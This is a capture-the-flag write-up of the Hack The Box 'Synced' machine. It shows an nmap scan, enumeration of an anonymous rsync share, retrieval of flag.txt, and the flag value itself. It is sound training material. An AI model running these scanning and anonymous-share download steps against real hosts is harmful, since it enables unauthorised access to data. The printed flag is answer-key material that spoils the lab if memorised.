# HTB - Starting Point - Synced

🇧🇷 [Versão em Português](./README-synced.pt-BR.md)

| Info         | Detail        |
|--------------|---------------|
| Platform     | Hack The Box  |
| Track        | Starting Point|
| Difficulty   | Very Easy     |
| OS           | Linux         |
| Status       | ✅ Completed  |

## Table of Contents
- [HTB - Starting Point - Synced](#htb---starting-point---synced)
  - [Table of Contents](#table-of-contents)
  - [Recon](#recon)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)
  - [Flag](#flag)
  - [Lessons Learned](#lessons-learned)

---

## Recon

I started the target machine through the HTB platform, which provided the target's IP address:

**Target IP:** `10.129.228.37`

I then connected to the Pwnbox (HTB's attack machine) and, through it, connected to the target's network via VPN.

I ran a full port scan with service/version detection to identify open ports and services on the target:

```bash
nmap -sV -p- 10.129.228.37
```

```
PORT    STATE SERVICE VERSION
873/tcp open  rsync   (protocol version 31)
```

Only port **873** was open, running **rsync** — a daemon used for efficient file synchronization and transfer, which can be configured with publicly accessible "modules" (shares).

---

## Enumeration

I checked the `rsync` client's help menu to review available options:

```bash
rsync -h
```

I first tried connecting directly to the daemon without specifying a source, which failed due to missing required arguments:

```bash
rsync --address 10.129.228.37 --port 873
```

```
rsync error: syntax or usage error (code 1) at main.c(1837) [Receiver=3.4.1]
```

The correct way to list the available modules on an rsync daemon is through the `rsync://` URL syntax. I listed the modules exposed by the daemon:

```bash
rsync rsync://10.129.228.37/
```

```
public         	Anonymous Share
```

A module named **`public`** was listed, with the description "Anonymous Share". I mistakenly tried connecting using the description text instead of the actual module name:

```bash
rsync rsync://10.129.228.37/Anonymous
```

```
@ERROR: Unknown module 'Anonymous'
```

I corrected this and listed the contents of the actual `public` module:

```bash
rsync rsync://10.129.228.37/public/
```

```
drwxr-xr-x          4,096 2022/10/24 18:02:23 .
-rw-r--r--             33 2022/10/24 17:32:03 flag.txt
```

A `flag.txt` file was present inside the `public` share, accessible with **no authentication required** (anonymous module).

---

## Exploitation

I downloaded the file to my local machine by specifying a destination path (`.` for the current directory):

```bash
rsync rsync://10.129.228.37/public/flag.txt .
```

I then read the file locally:

```bash
cat flag.txt
```

---

## Flag

```
72eaf5344ebb84908ae543a719830519
```

---

## Lessons Learned

- Rsync daemons can expose "modules" (shares) that don't require authentication — connecting via the `rsync://` URL scheme without credentials is enough when a module is configured for anonymous access.
- The module's display name/description (e.g. "Anonymous Share") is just descriptive text — the actual name used to connect is the module name shown in the leftmost column (`public` in this case).
- Listing a module (`rsync rsync://host/module/`) only shows its contents; a destination path must be provided to actually download files (`rsync rsync://host/module/file .`).
- Always run a full port scan (`-p-`), since services like rsync (port 873) aren't part of Nmap's typical top ports in every scenario, and may be the only entry point on a host.
